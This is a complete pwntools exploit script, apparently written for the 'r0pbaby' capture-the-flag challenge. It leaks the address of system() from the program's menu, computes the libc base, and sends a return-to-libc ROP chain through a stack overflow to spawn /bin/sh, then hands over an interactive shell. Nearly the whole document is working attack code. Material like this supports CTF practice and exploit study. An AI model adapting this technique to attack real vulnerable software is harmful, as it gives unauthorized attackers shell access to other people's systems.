#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

sys.path.insert(0, "/home/davis/CTF-Tools/Tools/roputils")
import roputils

HOST = "127.0.0.1"
PORT = 1234
ELF_PATH = "/home/davis/PWN/bata_24/r0pbaby/r0pbaby"
LIBC_PATH = "/home/davis/libc6_2.23-0ubuntu3_amd64.so"

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)
rop_libc = roputils.ROP(LIBC_PATH)

def get_number(msg, start, end, base):
    return int(msg[start:end], base)

if __name__ == "__main__":

    #r = remote(HOST, PORT)
    r = process(ELF_PATH)

    r.recvuntil(": ")


    r.sendline("2")
    r.sendafter(": ", "system\n")
    msg = r.recvuntil("4) Exit\n: ")
    libc_base = get_number(msg, msg.find(":"), msg.find("\n"), 16) 
    message("libc base(system)", libc_base)

    	
    rop_libc.set_base(libc_base, "system")
    # padding
    payload = rop_libc.fill(8) 
    # return-to-libc attack
    payload += rop_libc.call(rop_libc.addr("system"), rop_libc.str('/bin/sh'))
    
    r.sendline("3")
    r.recvuntil(": ")
    r.sendline(str(len(payload)))
    r.sendline(payload)
    r.recvuntil("Bad choice.\n")

    r.interactive()
